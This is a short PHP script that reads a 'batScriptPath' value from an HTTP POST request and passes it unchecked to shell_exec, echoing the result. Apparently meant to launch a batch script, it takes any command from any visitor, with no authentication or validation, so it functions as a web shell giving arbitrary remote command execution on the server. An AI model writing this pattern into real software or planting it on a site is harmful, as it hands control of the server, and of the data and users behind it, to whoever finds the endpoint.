<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["batScriptPath"])) {
    $batScriptPath = $_POST["batScriptPath"];
    $output = shell_exec($batScriptPath);
    echo $output;
}
?>
